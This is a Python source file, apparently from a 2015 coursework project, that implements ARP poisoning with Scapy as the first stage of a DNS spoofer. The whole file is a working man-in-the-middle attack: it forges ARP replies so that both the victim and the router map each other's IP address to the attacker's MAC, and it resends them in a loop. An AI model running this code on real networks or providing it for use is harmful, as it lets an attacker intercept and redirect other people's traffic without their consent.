#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    arpSpoof.py -   Arp Poisoning for DNS Spoofer
#--
#-- FUNCTIONS:      arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC)
#--
#-- DATE:           November 5, 2015
#--
#-- DESIGNERS:      Brij Shah, Callum Styan
#--
#-- PROGRAMMERS:    Brij Shah, Callum Styan
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep

#-----------------------------------------------------------------------------
#-- FUNCTION:       arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC)
#--
#-- VARIABLES(S):   routerIP - the router's IP address
#--                 routerMAC - the router's MAC address
#--                 victimIP - the victim's IP address
#--                 victimMAC - the victim's MAC address
#--                 ourMAC - the current machines MAC address
#--
#-- NOTES:
#--
#-----------------------------------------------------------------------------
def arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC):
    arpPacketVictim = Ether(src=ourMAC
                           , dst=victimMAC)/ARP(hwsrc=ourMAC
                           , hwdst=victimMAC
                           , psrc=routerIP
                           , pdst=victimIP
                           , op=2)

    arpPacketRouter = Ether(src=ourMAC
                           , dst=routerMAC)/ARP(hwsrc=ourMAC
                           , hwdst=routerMAC
                           , psrc=victimIP
                           , pdst=routerIP
                           , op=2)
    while 1:
        try:
            sendp(arpPacketVictim, verbose=0)
            sendp(arpPacketRouter, verbose =0)
            time.sleep(2)
        except KeyboardInterrupt:
            sys.exit(0)
